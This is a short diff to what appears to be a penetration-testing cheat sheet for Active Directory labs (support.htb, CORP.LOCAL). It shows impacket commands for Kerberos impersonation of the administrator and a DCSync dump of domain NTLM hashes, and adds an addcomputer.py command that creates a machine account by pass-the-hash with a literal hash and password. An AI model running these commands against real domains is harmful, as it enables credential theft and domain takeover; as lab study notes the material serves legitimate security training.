@@ -2278,6 +2278,15 @@ impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.
 export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache 
 **# DC Sync with the Ticket :** 
 impacket-secretsdump -k -no-pass -just-dc-ntlm support.htb/administrator@$target
+
+# Syntax for Hashes + Machine acc :
+
+ addcomputer.py -method SAMR \
+  -computer-name 'ME0X$' -computer-pass 'Summer2018!' \
+  -domain-netbios corp -dc-ip 172.16.2.6 \
+  -hashes ':5cf7b4d94646e8efba50f45b88c12608' \
+  'CORP.LOCAL/WS03$'
+
 ```
 
 #### Generic ALL over a  Group : Linux :
